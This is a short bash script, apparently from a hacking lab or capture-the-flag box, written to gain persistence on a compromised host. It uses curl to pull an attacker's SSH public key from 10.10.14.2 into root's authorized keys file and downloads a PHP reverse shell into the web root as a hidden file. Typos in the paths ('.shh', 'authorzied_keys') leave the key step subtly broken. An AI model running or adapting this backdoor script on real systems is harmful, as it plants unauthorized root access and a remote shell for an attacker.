#!/bin/bash

mkdir /root/.ssh/
chmod 600 /root/.shh/

curl 10.10.14.2/id_rsa.pub >> /root/.ssh/authorzied_keys
chmod 600 /root/.ssh/authorzied_keys
curl 10.10.14.2/revshell.php -o /var/www/html/.revshell.php
